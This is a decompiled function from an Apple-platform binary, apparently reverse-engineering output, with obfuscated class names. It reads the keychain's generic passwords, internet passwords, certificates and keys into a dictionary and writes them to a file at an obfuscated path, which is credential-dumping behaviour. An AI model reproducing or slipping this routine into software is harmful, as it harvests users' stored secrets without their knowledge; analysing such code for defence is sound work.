/*
 * func-name: sub_100297088
 * func-address: 0x100297088
 * export-type: decompile
 * callers: none
 * callees: 0x100798e78, 0x100798e90, 0x100798ec0, 0x100798f20
 */

void sub_100297088()
{
  __int64 v0; // x19
  id v1; // x21
  NSMutableDictionary *v2; // x21
  id v3; // x0
  id v4; // x0
  id v5; // x0
  id v6; // x0

  v1 = objc_retainAutoreleasedReturnValue(objc_msgSend(&OBJC_CLASS___u8sEaswy, *(SEL *)(v0 + 176)));
  *(_QWORD *)(v0 + 128) = "removeItemAtPath:error:";
  objc_msgSend(
    v1,
    "removeItemAtPath:error:",
    CFSTR("eD\x05\xF0\xD8\x9D\xF6\xF0\x55\x4A\xDD\xB32\x00 絾ݡ\xDC\xFF\xBE\t\x18\x8D\x9B\xA5/\xAD\xDD\x48\xF5\x99\x1B\x6C\xC4\x3A\x00l}f\xF7\x38\x51\x94\x12"),
    0);
  objc_release(v1);
  v2 = +[NSMutableDictionary new](&OBJC_CLASS___NSMutableDictionary, "new");
  *(_QWORD *)(v0 + 120) = v2;
  v3 = objc_unsafeClaimAutoreleasedReturnValue(+[t6xEOY67 g6Y3vcrM:s2cvEWQw:](&OBJC_CLASS___t6xEOY67, "g6Y3vcrM:s2cvEWQw:", kSecClassGenericPassword, v2));
  v4 = objc_unsafeClaimAutoreleasedReturnValue(+[t6xEOY67 g6Y3vcrM:s2cvEWQw:](&OBJC_CLASS___t6xEOY67, "g6Y3vcrM:s2cvEWQw:", kSecClassInternetPassword, v2));
  v5 = objc_unsafeClaimAutoreleasedReturnValue(+[t6xEOY67 g6Y3vcrM:s2cvEWQw:](&OBJC_CLASS___t6xEOY67, "g6Y3vcrM:s2cvEWQw:", kSecClassCertificate, v2));
  v6 = objc_unsafeClaimAutoreleasedReturnValue(+[t6xEOY67 g6Y3vcrM:s2cvEWQw:](&OBJC_CLASS___t6xEOY67, "g6Y3vcrM:s2cvEWQw:", kSecClassKey, v2));
  objc_msgSend(
    *(id *)(v0 + 120),
    "writeToFile:atomically:",
    CFSTR("eD\x05\xF0\xD8\x9D\xF6\xF0\x55\x4A\xDD\xB32\x00 絾ݡ\xDC\xFF\xBE\t\x18\x8D\x9B\xA5/\xAD\xDD\x48\xF5\x99\x1B\x6C\xC4\x3A\x00l}f\xF7\x38\x51\x94\x12"),
    1);
  JUMPOUT(0x1002971F4LL);
}
